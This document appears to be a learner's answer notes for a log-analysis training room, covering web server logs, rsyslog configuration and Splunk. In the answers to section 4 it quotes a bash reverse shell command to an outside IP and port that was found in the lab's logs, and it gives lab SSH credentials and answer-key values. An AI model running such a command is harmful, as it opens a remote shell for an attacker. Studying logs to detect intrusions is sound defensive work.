@@ -1,0 +1,56 @@
+1.Introduction
+
+This room covers how logs can be used to record an adversary's actions, the tools and techniques needed to perform log analysis, 
+and the significance of effectively collecting and analysing logs.
+Understand the importance of logs as a historical activity record for identifying and mitigating potential threats.
+Explore various types of logs, logging mechanisms and collection methods across multiple platforms.
+Gain hands-on experience detecting and defeating adversaries through log analysis.
+
+2.Expanding Perspectives: Logs as Evidence of Historical Activity
+
+Start the Machine for Split View or connect with ssh user damianhall password Logs321!
+
+Use sudo -l to see what damianhall can use
+
+Logs are a record of events within a system
+
+Answers:Perry,/var/log/gitlab/nginx/access.log
+
+3.Types, Formats, and Standards
+
+Since we are talking about a nginix that is a web server a web server log is what we search and in this case its the 
+NCSA Combined Log Format.
+
+Answer:Web Server Log,Combined
+
+4.Collection, Management, and Centralisation
+
+Sounds like a good tool for working with logs.
+Splunk is a platform for collecting, storing, and analysing machine data. It provides various tools for analysing data, 
+including search, correlation, and visualisation. It is a powerful tool that organisations of all sizes can use to 
+improve their IT operations and security posture.
+
+The configuration part:
+
+nano /etc/rsyslog.d/98-websrv-02-sshd.conf
+
+Here be careful to write it like this else the log file never gonna appear
+
+$FileCreateMode 0644
+:programname, isequal, "sshd" /var/log/websrv-02/rsyslog_sshd.log
+
+sudo systemctl restart rsyslog
+
+ssh localhost 
+(password is Logs321!)
+
+Compare the ip of stansimon (34.253.159.159) then you onna find which command he trys to run
+
+Answer:stansimon,10.10.10.101,/bin/bash -c "/bin/bash -i >& /dev/tcp/34.253.159.159/9999 0>&1"
+
+5.Storage, Retention, and Deletion
+
+Try to use ssh connection to the machine because since i cant copy paste the code its really a pain to type so much
+
+Gonna continue on the next day(Day 5) and dont make the mistake like me closing the AttackBox while you are connected with ssh 
+because it closes the connection ... its late haha, mistakes happen and the next day i can try again ;)
